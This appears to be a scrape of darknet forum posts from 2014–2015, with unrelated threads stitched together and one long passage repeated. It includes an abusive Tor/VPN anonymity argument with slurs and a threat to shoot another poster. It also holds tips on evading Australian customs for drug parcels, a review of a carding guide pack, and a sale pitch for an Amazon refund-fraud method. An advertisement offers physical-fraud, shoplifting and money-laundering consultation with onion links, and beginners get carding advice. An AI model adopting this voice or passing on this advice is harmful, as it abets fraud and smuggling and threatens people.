"Evolution Forums","popadoppalus","16381","2014-07-13T05:15:02","Re: Ultimate Guide 2 Anoynimty With An Isolated Environment...","Security & Anonymity","i think there are a bunch of mistakes in your methodology. first off, at least here in USA VPN providers are not required to keep logs and why would they since this is one of their big selling points. if LE serves them the proper paperwork they can be forced to log your traffic, but that's an entirely different proposition from a general statement that all VPN providers log data. i use a VPN registered in my real name - but the purpose is to tunnel traffic from my ISP static IP to the VPN.  the point is that i don't want my ISP to see where i go - TOR or otherwise, i don't use bittorrent myself by my son in law does. The ISP blocks it so the VPN gets around that block. but let's just say i only use it for TOR. i am in a small town and using TOR could be equated with illegal activity by some small minded people. the police here picked up my 9 year old grandson who was walking to the library one (long) block away. Next let's assume that TOR gets compromised (could happen - usually it just crashes - but let's say a hole opens up and exposes the IP of VPN) big deal they trace it back to me through the VPN company who gives up my true IP and then they can go to local ISP and find me. of course the only time that would be an issue that i can think of would be if i were doing something online that illegal at that instant in and of itself - like viewing CP. if i were ordering an ounce of heroin, they would still need to go through all kinds of other hoops to catch anything. if i am using a public wifi to go to my VPN then all it does is protect me from people who might be sniffing the wifi traffic on an open network which is obviously a good thing (that I am tunneling). you say it doesn't matter which VM to use. of course it matters, you obviously don't want to use one with a back door. the whole purpose of a VM is to run in a closed environment - which is fine. do you trust Oracle who actually tries to install an adware toolbar when installing their JAVA runtime client. but if your environment is completely sealed within a VM then your choice of operating system is irrelevant and all that crap about configuring your linux network settings doesn't even apply if you are on OS in the VM that boots and creates its own config anyway. the OS running in the VM is oblivious to any other OS. all it can see and use are resources allocated to it by the VM. i have a personal preference for DSL (i don't mean digital subscriber line - it's a linux build with a 32MB -as in megabyte - footprint including a browser) i would suggest that you not google it but fire up your VPN and use duckduckgo.com. google scares the shit out of me - much bigger threat than NSA. google guys are sharp - NSA people have spend a lot of their time with bureaucratic bullshit like paperwork. also they are working for the government - if they were real sharp they would be working for Google. speaking of NSA i have no idea where you got that notion of being compromised by NSA controlling 2 (out of the 3) TOR relays. you must have just made that up. i would like to know of just one relay controlled by NSA - so i could a put a TOR secret service on it - they would never find it. so what does the NSA do with TOR? i'll get to that in a minute. you mentioned some kind thing about the torc config file. i couldn't follow it exactly because of the abreviated grammar style, but i would recommend that everyone read the documentation on the TOR site - there is one section in there where it lists a huge line of known compromised TOR nodes and explains how you add this list to your config so you never connect to them. it's a simple matter of doing a bit of homework and an obvious prcaution that everyone should. i personally run malwarebytes which often identifies relays that are susceptible to MITM attacks and prevents TOR from relaying through them and then displays a message. now back to NSA - they cast a wide net and scoop up tons of useless data. now they may have some storage capabilities for amount of TOR data - to be decrypted when they figure out how. maybe tomorrow - mabye in 50 years. the whole big scare about NSA having compromised TOR was caused by one incident. someone somehow got the IP of a TOR relay node and the DNS registration revealed that it was an IP assigned to SAIC - which is a computer company in Falls Church, VA, that is actually a front for the CIA. back in the early 90's i got offered a job with them (it was an interesting project) anyhow further investigation of the DNS provenance revealed that the server hosting this IP was an NSA server - and voila - the rumor flew faster than an SST that TOR had been compromised. Snowden PP presentations had 3 or 4 lectures where NSA expressed its frustration with TOR and their inability to compromise it. i think Google might have a bigger interest in data scraping DeepWeb than NSA. (do you realize that clearnet represents less than 1% of the internet  -  with the rest being the domain of the deepdark web?)  i have no issues with most of the stuff you listed but you failed to mention a rootkit which could defeat every precaution that you listed if it is loading at the BIOS level you can only detect it by using the checksum method you mentioned for ensuring your TrueCrypt download hasn't been injected with mischief. when was the last time you checked you BIOS? actually there are other methods besides checksum. there is another thread around here about truecrypt. i would suggest you use your VPN and duckduckgo to look up reprinted articles by Bruce Schiener (or something like that) he a good guy (our side type) of cybersecurity expert that 'decoded' Snowden's NSA docs and put them into a vernacular that the reporters could understand. he has excellent articles on how to stay secure. he states categorically that if the NSA wants your box they can own it. he bought a brand new computer that has never been connected to the wire and is airgapped and he uses it to encrypt and decrypt messages onto a USB stick and sneakerware to move the data. BTW starting with WIN7 you cannot make a USB stick autorun. even booting from it requires that you instruct the box to boot from it. one final thing about VPNs - which is another big plus - a VPN is generally immune from vulnerability scanners looking for boxes to exploit. it basically makes your computer invisible on the big web.   i am not trying to be overly critical of your methods. as you outlined them you are probably safe, at least for doing things like posting in a forum. aside from the fact that head of the CIA couldn't keep his affair secret (which is pretty troubling in itself - since he was the head spook) that had an email account that they both could access and they typed and edited drafts to each other and never mailed them. but anyone's required level of security depends on the task. there are tons of other techniques for improving security besides what you and i have listed.

Lemme tell u man u'r fucking old & useless shit like ur avatar seriously. Have u really understood any of my point? U call urself a hardware hacker lemme call u a Fucko. Now coming into my points U said in USA Vpn providers doesn't need to keep logs right. How do ya know about dat? Oh lemme guess old fella either u know one of em(1000s of providers out there) or u may b u'r one of em who's selling his fucking Vpn over another forum & feeling bad just because I'm exposing the real story behind Vpn providers. So u'r feeling a hard kick in ur ass right? They keep logs for a limited amount of time whether LE wants or not & with some bad intentions they can fuck u up. Now 4 Christ sake don't tell me dat u read peoples minds oldie so dat u know about their intentions. Man through out ur fucking comment it seems dat either u'r a security researcher or may b some shitty guy from NSA or may b a cop wid really little knowledge or anyone wid a bad intention to log noobs traffic. Dat's why u'r convincing noobs to register vpn account wid real infos so dat they'll b fucked up somehow. But if u really did register a vpn account wid ur real name den fuck urself man don't talk about anonymity cause u don't know anything about it. The only reason u'r still not fucked up is ur fucking luck fella. U said u don't want ur ISP to see where u'r connecting so dat u'r using Vpn. Man what r u actually? Do u know wht d fuck u just said? Gosh we've big assholes like u in DW who doesn't even know how bridges work. I'm suggesting u to stop using DW n go tor's website n teach urself how all these things works. May b go for CCENT but I don't think u can even take this, so N+ would b good but still have doubt cause u'r in d age when u should die. Man how d fuck u dragged bittorrent over here huh? Yeah Vpn is okay for it but my points never directed 2 Torrent did it? Vpn providers doesn't actually have any interest in Torrent traffic dat's why they're still in d market. But worse can happen if they target ur ip wid bad intentions. Now u said what if tor get compromised, it's not clear 2 me u mean tor itself or DW? If it's tor itself den my setup can't protect u from leaks not even any setup in my knowledge can do that unless u'r connecting from a Hacked(which is surely not possible 4 ya) or public wifi(which u can do pretty well). One point has to b noted u said tor usually crashes right? Now what do u mean about dat is it tor crashing frequently on ur system or u'r not able 2 connect 2 tor sometimes. If it's tor related to ur system den pls give me ur address & lemme free u from dis world by shooting u in d head. But if it's not den try 2 read tor's logs I assume u don't even know where it keeps logs. Can u remember d time when NSA took down Freedom hosting users just for visiting Pedo & other freedom hosting hosted sites. I guess u didn't visit Pedos wid ur setup otherwise u would b fucked up by now. Oh Jesus how can u visit pedo in ur age, u can't even MASTURBATE properly. No matter what u'r doing in DW it still considered as crime & worst can happen anytime. I know u know d word SNIFFING but at d same time I also know u don't have any fucking idea about Ettercap do ya? In my post I've clearly stated dat virtual machine software has to b proper if it has breach in itself or if it's outdated u can b under attack. I assume u don't know anything about Linux, actually how can u it'll b pretty darn tough for a old shit like u. Man Oracle was just an example u'r free 2 use anything else. Do u even know it's source is open u know what dat means? It means u'r free to mess around d source & make ur own build & there's nothing wrong wid d source. Now java runtime, do ya know about open jdk? I'm not a windows user, I never installed java on windows but if whatever u'r saying is true about it I'll take a look. But I think dat's an option on their installer. Don't confuse Windows wid LINUX. My setup requires LINUX as host not shitty windows. There's a bit of confusion in ur mind oldie I never said u can use VM(virtual machine software itself) wid a backdoor, what I said u can use any OS of ur choice inside d VM. Clear d shits out of ur head FUCKO. Yes u can use any OS wid backdoor cause it'll never make a connection to d CP as our socks port & ip will b unknown to it which is d only way to connect internet from d VM. I want u to go through my post again but I still have doubt if u can understand single point of it oldie. I'm feeling sorry 4 ya. Oh man u'r just pissing me off right now And I think I'll see ur craps in my punching bag after getting done wid dis post FUCKO. Why u just dragged over here DAMN SMALL LINUX DISTRO(DSL)? DSL is as old like u. It originally created wid old systems in mind n 4 some old shits like u who doesn't even know it's full form. R u having fucking problem wid ur eyes moron where I've said in my point dat NSA own 2  nodes out of 3? What I said my setup can't protect u if NSA will have 2 two nodes out of 3 Nodes(Entry, Middle & Exit). Didn't u see those things in d bracket where I've stated dat it still not happened & chances r once in a billion. It actually existed as theory(Do u know what it is?) It still not happened as per records but it can happen in future. Den my setup can't protect u not even any setup except hacked & public wifi. Now u said u'r unable to understand d torrc configuration in my post. Seriously how can ya, it's a sure sign u'r just crap wid some publicly available shitty knowledge. What d Configuration does it puts ""SocksListenAddress 195.16.0.1:9953"" which tells tor to open a socks port which is 9953 to listen 4 socks traffic on our Interface(which we created 4 our setup) ip which is 195.16.0.1 & which I cleared wid comments by providing ""#"". I don't think u even know ""#"" are used 4 commenting. And cocksucker b4 suggesting everyone u should check Tor website to get a clear idea about how it works. Man u should go back to 90's if possible or u should die & leave dis world asap. NSA is never able 2 compromise tor directly. What they can do they can exploit some human vulnerability like u got & as there's no patch 4 it by doing so they can take control over a DW site n inject it wid some fresh exploit which  OS can't handle n leaks identity. Wid my setup this identity leak is next to impossible as it drop packets(do u know what it is FUCKO?). Not even every one uses end 2 end encryption do u know dat? Did u just say dat u got a job offer from CIA. Some one pls kill dis Fucking Liar. Now I really can't control myself, what do u know about rootkit huh? Don't fucking showoff over here u asshole Fucker. U don't even any idea about RINGS, u don't even know what's a bootkit. Now u probably gonna search wid duckduckgo 4 it, isn't it? And will probably post some publicly available shits over here right? Don't even think about it cause that will again prove ur stupidity u son of a bitch. Oh man I just wasted to much time to ans ur shits. No hard feelings man but u should consider stop using tor n DW as in ur age it's not gonna b good 4 u if cops will somehow pick u up just 4 ur stupidity. Stop wasting others time n die asap n don't ever try 2 teach ur 9 year old grandson in ur way otherwise world will have another fucking joker or I can say looser like u. FUCK OFF FUCKO.

The ISP blocks it so the VPN gets around that block. but let's just say i only use it for TOR. i am in a small town and using TOR could be equated with illegal activity by some small minded people. the police here picked up my 9 year old grandson who was walking to the library one (long) block away. Next let's assume that TOR gets compromised (could happen - usually it just crashes - but let's say a hole opens up and exposes the IP of VPN) big deal they trace it back to me through the VPN company who gives up my true IP and then they can go to local ISP and find me. of course the only time that would be an issue that i can think of would be if i were doing something online that illegal at that instant in and of itself - like viewing CP. if i were ordering an ounce of heroin, they would still need to go through all kinds of other hoops to catch anything. if i am using a public wifi to go to my VPN then all it does is protect me from people who might be sniffing the wifi traffic on an open network which is obviously a good thing (that I am tunneling). you say it doesn't matter which VM to use. of course it matters, you obviously don't want to use one with a back door. the whole purpose of a VM is to run in a closed environment - which is fine. do you trust Oracle who actually tries to install an adware toolbar when installing their JAVA runtime client. but if your environment is completely sealed within a VM then your choice of operating system is irrelevant and all that crap about configuring your linux network settings doesn't even apply if you are on OS in the VM that boots and creates its own config anyway. the OS running in the VM is oblivious to any other OS. all it can see and use are resources allocated to it by the VM. i have a personal preference for DSL (i don't mean digital subscriber line - it's a linux build with a 32MB -as in megabyte - footprint including a browser) i would suggest that you not google it but fire up your VPN and use duckduckgo.com. google scares the shit out of me - much bigger threat than NSA. google guys are sharp - NSA people have spend a lot of their time with bureaucratic bullshit like paperwork. also they are working for the government - if they were real sharp they would be working for Google. speaking of NSA i have no idea where you got that notion of being compromised by NSA controlling 2 (out of the 3) TOR relays. you must have just made that up. i would like to know of just one relay controlled by NSA - so i could a put a TOR secret service on it - they would never find it. so what does the NSA do with TOR? i'll get to that in a minute. you mentioned some kind thing about the torc config file. i couldn't follow it exactly because of the abreviated grammar style, but i would recommend that everyone read the documentation on the TOR site - there is one section in there where it lists a huge line of known compromised TOR nodes and explains how you add this list to your config so you never connect to them. it's a simple matter of doing a bit of homework and an obvious prcaution that everyone should. i personally run malwarebytes which often identifies relays that are susceptible to MITM attacks and prevents TOR from relaying through them and then displays a message. now back to NSA - they cast a wide net and scoop up tons of useless data. now they may have some storage capabilities for amount of TOR data - to be decrypted when they figure out how. maybe tomorrow - mabye in 50 years. the whole big scare about NSA having compromised TOR was caused by one incident. someone somehow got the IP of a TOR relay node and the DNS registration revealed that it was an IP assigned to SAIC - which is a computer company in Falls Church, VA, that is actually a front for the CIA. back in the early 90's i got offered a job with them (it was an interesting project) anyhow further investigation of the DNS provenance revealed that the server hosting this IP was an NSA server - and voila - the rumor flew faster than an SST that TOR had been compromised. Snowden PP presentations had 3 or 4 lectures where NSA expressed its frustration with TOR and their inability to compromise it. i think Google might have a bigger interest in data scraping DeepWeb than NSA. (do you realize that clearnet represents less than 1% of the internet  -  with the rest being the domain of the deepdark web?)  i have no issues with most of the stuff you listed but you failed to mention a rootkit which could defeat every precaution that you listed if it is loading at the BIOS level you can only detect it by using the checksum method you mentioned for ensuring your TrueCrypt download hasn't been injected with mischief. when was the last time you checked you BIOS? actually there are other methods besides checksum. there is another thread around here about truecrypt. i would suggest you use your VPN and duckduckgo to look up reprinted articles by Bruce Schiener (or something like that) he a good guy (our side type) of cybersecurity expert that 'decoded' Snowden's NSA docs and put them into a vernacular that the reporters could understand. he has excellent articles on how to stay secure. he states categorically that if the NSA wants your box they can own it. he bought a brand new computer that has never been connected to the wire and is airgapped and he uses it to encrypt and decrypt messages onto a USB stick and sneakerware to move the data. BTW starting with WIN7 you cannot make a USB stick autorun. even booting from it requires that you instruct the box to boot from it. one final thing about VPNs - which is another big plus - a VPN is generally immune from vulnerability scanners looking for boxes to exploit. it basically makes your computer invisible on the big web.   i am not trying to be overly critical of your methods. as you outlined them you are probably safe, at least for doing things like posting in a forum. aside from the fact that head of the CIA couldn't keep his affair secret (which is pretty troubling in itself - since he was the head spook) that had an email account that they both could access and they typed and edited drafts to each other and never mailed them. but anyone's required level of security depends on the task. there are tons of other techniques for improving security besides what you and i have listed."

U said u pointed valid flaws in my method right? Fucko do u even know what does ISOLATED mean? Have u ever heard about WHONIX which is using same approach, so by abusing my methods r u trying to abuse WHONIX & which is d only thing out there which provides true anonymity unless there's a breach in tor itself. Man u really have no fucking idea what u talking about & who u r talking to. May b I'm d one who's providing u proxy or vpn. U said I can't provide VPN. Lemme ask u something, do u even know how to configure openvpn FUCKO? U said I'll get caught wid my setup, yeah it's true if there wl b any breach in tor itself I'll get caught so as d WHONIX & other users. But we wl b safe if there wl b breach in DW sites. But then u & ur followers wl not b safe, this I can guarantee OLDIE. Now u said u were a Network admin over 15,000 nodes for 15 years. Hey mother fucker stop lying, do ya even know how does TCP handshakes work? Oh man dat's huge 4 ya lemme ask ya something else, do ya even know what is ARP or probably I can ask do u know anything about OSI layers? Yeah I know u've more experience in computer which I'm sure in DOS or probably Microsoft right? Lemme tell u MORON, u'r fucking OBSOLETED & I'm UPGRADED. Do ya know what dat means? Do even know who has written LINUX kernel first? Admit it it u'r just a old OBSOLETED shit who needs to b terminated right now. Now u said u've over 30years of experience in programming, man lemme laugh at first, do u even know what is array? No man whoever is following me they're upgrading themselves & securing their asses but whoever is following u becoming OBSOLETE SHIT like u cause u'r d one who doesn't even wanna upgrade. Fuck u. Oh again why u'r making jokes of urself huh? In ur previous post u've doubted about Oracle virtual machine right & I told ya it's open source which u didn't even know. Now u'r asking me how does VM works? Lemme ask ya something, have u ever used vm in reality u penis less shit? Now u said u've degrees in Math, Phsics & bla bla bla. And u called me a school drop, how do u know about dat DICKHEAD? Man stop presenting urself as knowledgeable shit by posting some GK over here. Do u even know How many domains are there in CISSP(u know what is it MORON?). U wanna teach me how many 0s r there in Billion? Teach urself how to convert decimal to binary first. U have no fucking idea what I've done wid my setup which u even never could imagine in ur meaningless journey of life. Cause u'r just a big talker which I'm not. U know out of 100% 80% guyz are innocent who're suffering behind d bars. Cause Authorities like to pick innocents & it happens from d past which u can't imagine cause I suppose u ever touch a history book in ur life u dumb ass. U said u mentioned some easy steps to ignore known bad nodes & I posted some craps. Do u know there r hard coded entry nodes in tor, do even know dat Hidden service doesn't even leave exit nodes & what about unknown bad nodes huh? Whether my setup or something else traffic has to b end 2 end encrypted to keep infos safe from exit nodes no matter if it's good or bad. Yeah I asked 4 comments cause I wanted to see some morons like  u who doesn't have any idea about anonymity & doesn't even wanna upgrade cause it hurts their ego. I already got few response from those who really cares about anonymity & yeah it's not dat much cause we've some crazy MORONS like u in dis forum who stops others from becoming upgraded wid their obsoleted tutorials.

I don't want em to put me up on d platform & hail me like a king cause I already got lots of respect from my followers which is ur dream only & I know u want it most dat's why u'r showing off here wid some publicly available knowledge.

Have u really worked NASA isn't No. 1 Ass Sucker Association? Yeah I know it is, Kiss my ass u old fucking shit.

Weve all had orders that havent arrived so I think its a good idea to discuss things that we know are detrimental to packages arriving so that we can work out better ways of getting things in. Im not suggesting we discuss ways to get successful orders but just things that we know contribute to seizures. This kind of discussion should help us all and shouldnt be any kind of new news to LE. Ill start. I cant say this with any certainty but from what Ive been told about mail profiling in Australia; General info:Apparently there is a database of all addresses and known residents at these addresses. This data could be gained from electoral records, relevant registration and license authorites or even utility companies, not sure. If international mail is coming to an address and a name not associated with it pops up the piece of mail gets scrutinized.Apparently there is also a database of properties that are on the market for sale and rent and anything going to those addresses within a certain time frame is also scrutinized.Can anyone confirm if mail from particular countries is put aside for checking, like NL would be on a list like that surely? Packaging:Several packages have been opened that had those hand written declarations on them. They were either declared openely as medicinal items or labelled as something else non related which if felt with the hands would be obvious was not inside the package. In each case it was blister packs that were ordered. Prescription pills still came through providing they didnt have any recreational value (scheduled I guess?)Packages have not show up with fear that they had been seized but no LL was sent. Was later found that the vendors had gone rogue which gives some peace of mind as its better than having things confiscated. LLs have been received for RX type drugs.  Has anyone received one for something with a higher schedule? Does anyone know how blacklisting works?  Is it based on names or addresses and will a name on one blacklisted address raise suspicion if used at a completely different address? I read various articles that state that Australia gets 5 billion pieces of mail each year from overseas but then other sources claim the number of letter or envelope packages is closer to 180 million which would make it easier to screen. Anyone have facts about these figures? Share some stories, theories and other information that relates to this but be careful of opsec! The more we know about what is failing can only work to help us think of ways ourselves to have successful transactions. This should be put on agora forums when they come up too

Australia DOESN'T use the American Postal System where mail is cross checked with a database containing addresses and the names of each occupant living at that address.

Australia Post use the postcode on the letter / parcel to determine where it goes and the name on the letter / parcel in question is completely irrelevant. Seriously mate, I won't be saying anymore because there are just too many inaccuracies in your post to comment on however this subject is something an International vendor themself needs to research and experiment with rather than just us little ol' Aussie buyers. Packing and stealth are skills which take time to learn and master requiring creativity, innovation and the ability to think outside the box.

"Evolution Forums","Emmet","53941","2015-03-05T08:09:10","Re: Australians!!! Lets put our heads together","Security & Anonymity","Mate, there is no way Australian Customs are cross referencing the names on letter mail to see if it matches a database of the current occupants living in that property. The vendor, the person/s in charge of preparing your package for an International delivery, are the only people who can do what is required to give your package the best opportunity of making it through Customs. You as a customer have no real influence over how a vendor operates. Some vendors are just good at what they do and genuinely take an interest in making sure you get your order where as other vendors take the position of ""once Ive posted your package, it's out of my hands"". Those type of vendors shouldn't be sending gear overseas as they're not up to the challenge and don't care if your package arrives or not. Things have definitely tightened up in Customs but we all have to expect that will happen all around the world. However vendors need to innovate and experiment with different methods, developing new techniques or expanding on ones they already use. Vendors can't just sit on their hands and hope for the best because that way of thinking is destined to fail! Inventions are born out of necessity and the good vendors will always be looking at ways to improve. Australia isn't using special techniques to detect seizures. The US has more sophisticated equipment than us in Australia but that's to be expected when the influx of both mail and visitors iis huge when compared to a country like Australia. I was using a vendor approx. two years ago who never lost a single package sent to Aus (and we are not talking about 1 or 2g packages here). His stealth was beyond parallel and to be truthful, was quite incredible. I've never seen anything like it since and may never see packaging like that ever again. It was so good, packages were opened and inspected by Customs Officers yet nothing was found or detected. They were then re-sealed and sent to me containing decent quantities of illegal drugs. Ohh, the memories.................................................................................................","Yahtzeema wrote:Im aware any name can be used, it would seem ridiculous to even think that a different name would mean a normal package wouldnt get delivered.

Luksus: A terminal program for Linux and BSD that lets you encrypt and decrypt data using Geli, LUKS, GnuPG or Truecrypt. A wrapper around tcplay, Geli and cryptsetup, with a front end graphical interface for those who find the command line too difficult. RealCrypt: An open source forked version of Truecrypt for Fedora Linux, it comes as a RPM package and it can be easily installed in Fedora using the repositories. It has a graphical interface and the same capabilities that Truecrypt has, with a different name and logo as requested by Truecrypt licensing terms. There are no significant code differences in between them.  Encrypted Data Storage (EDS): Android app that can create and open any Truecrypt container but there is no on the fly mode and data will be decrypted to a temporary file, this could be a security risk if you believe that your smartphone can be stolen as temporary data written to solid state disks is recoverable with forensic tools.  Cryptonite: Open source app that brings EncFS and Truecrypt to your Android phone, the program is still in development and intended for advanced users. Cryptonite can decrypt any Truecrypt container using your smartphone. If you want to run Android in your desktop, there is an open source project that has ported it to PCs and can be installed as if it was a Linux distribution. This will give you a bigger screen when decrypting data.","nele_lo wrote:truecrypt - safe version FTW ... as long you do not live in a country were they can put you in prison for not telling the password for encryption.take care/nele"

LE won't admit it but they are frustrated by encryption. but they are probably frustrated by a lot of other shit as well.  they just don't talk about it much in public. but the op-procedures now are to raid at 6:00 AM hoping to find the box unencrypted (running), so if you are going to use encryption then turn off your PC when not in use. personally i have an encrypted USB stick ( and good hiding place)  that holds all my sensitive files. it is encrypted. also i run TOR from USB stick (not the same one) just because i can toss it in the box with other 50-60 other USB sticks on the desk. it is stand alone and requires no reg settings so it is indeed portable. it's a good idea to verify TBB checksum, as there are malicious versions of TOR floating around.",""

The author of this thread should use TrueCrypt 7.1a on all volumes. He should create hidden volumes if he can handle the complexity. You should have a 'secure' OS that is run as a virtual machine, stored on a USB stick. Data loss is a risk with good opsec, so you also have to be careful about that, at the same time you secure your opsec. Right now, I'd say you are 100% vulnerable were the police seize your PC. Whether they expend the resources to bother to look through your PC depends on the crimes you're accused of, if any.

Content review:I don't consider myself a carding veteran, but for me there were a lot of useful information (that ~300 page eBook about security is already making its way to printer) and a lot of guides I found there were new to me.Of course there were a lot of information which I already knew or had heard about. Content of guides is nicely split into sub-sections divided by type of virtual or physical stuff you would be interested in.There are total ~60 guides (I count valuable information or resources as guide) included in his collection and almost all of them are very detailed and well explained.Most of these guides are not country/region locked and can be done from your suburb apartment or your villa. Conclusion:This method is probably a must have for those who are new to this field, because information which in this pack is more than enough to make few thousand dollars buy implementing more than one of guides in your daily carding session after getting your dry martini and swim in your private pool. for those who already have some experience in this field there probably will be less useful information, but some of aspects described in already known methods are cute and this is great addon for those who always are looking for SE aspect in methods, because lot of them involve that (and we all know it is fun as hell). Rating: For new carders - 5/5For experienced carders - 3.5/5 (Just because a lot of information you will already be aware of) Cheers,DoubleT

This is a new and exciting way to get refunds on Amazon without ever having to stop and never returning the items. Making for HUGE profit. Why a new method? Why use the old one? It is more likely to get you caught in the end game, and more likely to get refused in the near future. It'll get fixed and people will need a new way like this one! Why only a few sales? I'd rather a good 5 people buy it for a premium price and it stay hidden then selling it for a little amount unlimited amount of times and it gets fixed in the near future. Why only one person? It has huge potential for someone who already sells guides on this but they are outdated, I have purchased quite a few Amazon refund guides from the marketplace and a lot seem to be old played out ones that won't work anymore. I'm especially talking to ""meatmaster"" shame on you for selling your guide that does not work anymore and anyone who messages him to take it down gets ignored. Regardless a already known seller can use or sell this method for a more premium price. This sale includes two methods. One for beginnersOne for people that want to use this to the extreme Both of which are not sold on the marketplace, I have bought tons of guides and none use these methods. I WILL NOT GIVE OUT A VOUCHER ONE OR FREE COPY FOR FEEDBACK! I have done this to a guy that is self proclaimed ""The highest post count user on Evo"" and he took my method and didn't leave feedback. I'm here under a new name and looking to sell this.

I've given out a few free copies of my personally developed method to making quick cash (physical fraud guide) to mixed reviews - it seems I misjudged the marketplace when I thought that people would jump at the opportunity to pick up a hand-tailored method for performing physical fraud when in reality, most users want to hang out at their computer monitor carding all day (fair enough, it's good money). So I'm here to reinvent myself - to fix this trust issue regarding the originality of my guides and to generate some positive feedback around committing physical fraud, which in itself is easy enough. Just takes some misdirection, smooth talking and calm composure. I'm now offering consultation, cashout guides as well as the original methods I've developed. These methods are USA only - with an emphasis on Washington, Colorado, California and New Jersey.  General Consultation Topics: -hand tailored, unique credit card cashout method-how to build legitimate credit fast with little effort, legally-shoplifting techniques (different material than the clearnet guides available for free - I guarantee it)-how to hit your mark - tips for misdirection, smooth talking and how to keep your cool Rates are negotiable - I'll work out package deals and I'm willing to entertain the idea of cleaning money, assuming the interest is there on the communities part. Listings:http://k5zq47j6wd3wdvjq.onion/listing/3981http://k5zq47j6wd3wdvjq.onion/listing/4067 Reviews:  Get in touch with me here on the forums or at fanmanstan@safe-mail.net edit: Is there no interest on the dark web for physical fraud? I'm no fake like that austin powers faggot - Yasuo, Gold and finesser have all seen the guide and can attest to it's legitimacy... both Yasuo / Gold decided to stay away from it as it requires physical appearances but the risk is really very minimal - at least for a period of 4-6 months of consistent use. Anything past that is beyond what I've done with it - I use it for a while and then take a break; it has paid my bills a few times when things got particularly bad but to be honest most of what I saw in it came from enjoying the act of fraud / liking having my pockets full of spending cash. you can also reach me on blackbank market ---http://omo6o7akcampiryq.onion/vendor/StansPhysicalFraudShop

(bill/ship policy,security levels etc.) trying is good. for the best experiences you keep your tryings. sometimes, banks send a sms to card holder after a transaction and you can't know this. within 20 minutes card holder may cancel his/her card.in my opinion you're on the right track just now. for beginning adventures you could try for digital goods. for example some AV's or download managers. after 2 months you'll see that u can card easily.

PGP encryption is there for your protection more than the vendor. The vendor isn't disclosing any sensitive information unless otherwise. You can either stop the communication or you can carry on. It's strange that a vendor can't decrypt messages from his customers. You can never be too careful, anyone who can't communicate through encryption when required should be questioned in my opinion. From what you have said, it doesn't appear to be a fault of yours.All you have to do is goto your PGP software clipboard, input whatever you want to be encrypted then select his public key and send the encrypted message. All he has to do is do the same, copy to clipboard then decrypt and then do whatever he has to do.  Tread carefully.",""

Make sure you only encrypt it to a single key. You should avoid using third party services like privnote, if you must then at least use the onion service http://sms4tor3vcr2geip.onion/",""
